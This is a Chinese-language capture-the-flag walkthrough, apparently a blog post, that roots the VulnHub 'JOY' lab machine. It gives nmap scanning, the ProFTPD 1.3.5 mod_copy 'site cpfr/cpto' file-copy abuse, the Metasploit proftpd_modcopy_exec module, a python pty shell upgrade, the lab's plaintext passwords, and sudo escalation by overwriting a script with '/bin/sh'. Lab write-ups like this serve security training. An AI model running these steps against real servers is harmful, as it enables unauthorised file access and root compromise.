本周实践的是vulnhub的joy镜像，下载地址，https://download.vulnhub.com/digitalworld/JOY.7z，

启动靶机，知道是个debian系统，有个账户是patrick，

先来个地址扫描，sudo netdiscover -r 192.168.137.0/24，

接着来个端口扫描，sudo nmap -sS -sV -T4 -A -p- 192.168.137.85，

知道用了ProFTPD，但是没扫出来版本号，此处是这个靶机奇葩的地方，好在匿名可登录，注意用anonymous登录，密码是空的，发现upload目录里有文件，而且可以下载，

下载directory文件，查看内容发现一个叫version_control的文件高度可疑，

获得version_control文件的过程有些传奇，全靠猜测，

首先是猜测当前的ProFTPD软件是1.3.5版本，那就有File Copy漏洞，

同时还要通过经验猜测ftp和patrick目录的绝对路径，尝试后发现还真对了，

site cpfr /home/patrick/version_control，

site cpto /home/ftp/upload/version_control，

version_control文件这就到了ftp的upload目录里了，

下载version_control文件，查看内容发现ProFTPD软件还真是1.3.5版本，还提示了一个web站点的绝对路径，/var/www/tryingharderisjoy，

因为ProFTPD1.3.5版本除了有File Copy漏洞，还有个更厉害的命令执行漏洞，这个web站点的绝对路径提示正是时候，上metasploit，

msfconsole，
search proftpd 1.3.5，


use exploit/unix/ftp/proftpd_modcopy_exec
show options


set RHOSTS 192.168.137.85
set SITEPATH /var/www/tryingharderisjo
exploit

拿到的shell不是root的，接下来就想办法提权，

老规矩，用python命令转成可交互的shell，

python -c 'import pty;pty.spawn("/bin/bash")'，

在ossec目录的patricksecretsofjoy文件里发现了账户密码，

patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

root的密码不对，patrick的密码是对的，

查看patrick的sudo权限，发现个彩蛋，patrick能以root权限执行/home/patrick/script/test，

执行了一下当前的/home/patrick/script/test，不行，

那就想办法把/home/patrick/script/test替换成自己的，

还是得利用ProFTPD1.3.5版本的File Copy漏洞，

本地先做个test文件，echo "/bin/sh" > test，并上传到ftp的upload目录，

把ftp的upload目录下的test文件替换到/home/patrick/script/test，

site cpfr /home/ftp/upload/test，

site cpto /home/patrick/script/test，

再次执行sudo /home/patrick/script/test，

至此拿root权限成功。
